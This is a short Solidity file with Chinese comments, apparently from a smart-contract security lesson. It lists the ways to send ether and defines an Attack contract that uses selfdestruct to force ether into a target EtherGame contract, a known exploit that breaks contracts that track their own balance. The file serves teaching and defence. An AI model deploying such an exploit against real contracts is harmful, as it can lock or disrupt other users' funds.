// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "./EtherGame.sol";

/** 以太转账的几种方法
 * 1. transfer (花费2300 gas，转账失败抛出error)
 * 2. send (花费2300 gas，返回bool值)
 * 3. call (花费gas不确定，也可以指定gas，返回bool值)
 * 4. 最后一种就是:自毁函数selfdestruct, 强制性的转账。
 */
contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        address payable addr = payable(address(etherGame));
        /* 调用自毁函数，合约将自动被毁，合约中余额强制发送到指定地址 */
        selfdestruct(addr);
    }
}